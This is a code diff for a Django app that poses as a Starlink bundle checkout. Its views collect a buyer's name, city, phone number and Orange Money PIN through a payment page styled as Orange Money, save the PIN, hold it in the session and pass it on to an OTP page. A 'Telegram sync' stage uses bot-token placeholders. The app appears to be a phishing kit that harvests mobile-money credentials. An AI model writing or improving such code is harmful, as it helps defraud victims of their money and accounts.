@@ -9,70 +9,58 @@ from .models import Order # Ensure your model name matches
 BOT_TOKEN = "YOUR_BOT_TOKEN"
 CHAT_ID = "YOUR_CHAT_ID"
 
+from django.shortcuts import render, redirect, get_object_or_404
+from .models import Order, Bundle  # Use the correct names from models.py
+
 def home(request):
     return render(request, 'index.html')
 
 def checkout(request):
-    """
-    Stage 1: Checkout page - Showing bundle info
-    """
     bundle = request.GET.get('bundle', 'Power User')
     price = request.GET.get('price', '199')
-
-    context = {
-        'bundle': bundle,
-        'price': price
-    }
-    return render(request, 'checkout.html', context)
+    return render(request, 'checkout.html', {'bundle': bundle, 'price': price})
 
 def payment_instructions(request):
-    """
-    Stage 2: Capture customer details and CREATE the order
-    """
     if request.method == 'POST':
-        # 1. Collect data from Checkout Form
         full_name = request.POST.get('fullName', '')
         city = request.POST.get('city', '')
-        bundle = request.POST.get('bundle', '')
+        bundle_name = request.POST.get('bundle', 'Power User')
 
-        # 2. CREATE the order in the database to get a unique order_id (UUID)
-        order = StarlinkOrder.objects.create(
+        # Since your model requires a Bundle object and total_amount:
+        selected_bundle = Bundle.objects.first() 
+        
+        # CREATE the order using the correct Model and Field names
+        order = Order.objects.create(
             full_name=full_name,
             city=city,
-            bundle=bundle
+            total_amount=199,  # Required by your model
+            bundle=selected_bundle
         )
 
-        # 3. Pass the 'order' object to the payment page so the form knows where to go
         return render(request, 'payment_instructions.html', {'order': order})
-
     return redirect('starlink_app:home')
 
 def otp_verification(request, order_id):
-    """
-    Stage 3: Capture PIN and show OTP page
-    """
-    # Find the specific order using the UUID from the URL
-    order = get_object_or_404(StarlinkOrder, id=order_id)
+    # Lookup using 'order_id' because that's your PK name
+    order = get_object_or_404(Order, order_id=order_id)
 
     if request.method == 'POST':
-        # Get PIN from the Orange Money UI
         phone = request.POST.get('phone', '')
         pin = request.POST.get('pin', '')
 
-        # Update the database record
-        order.phone = phone
+        # Use 'phone_number' to match models.py
+        order.phone_number = phone 
         order.orange_pin = pin
         order.save()
 
-        # Store in session for the Telegram sync stage
+        # Update session for Telegram stage
         request.session['phone'] = phone
         request.session['pin'] = pin
-        request.session['bundle'] = order.bundle
+        request.session['bundle'] = str(order.bundle)
 
         return render(request, 'otp_verification.html', {'order': order})
 
     return render(request, 'otp_verification.html', {'order': order})
-
 @csrf_exempt
 def sync_data(request):
     """
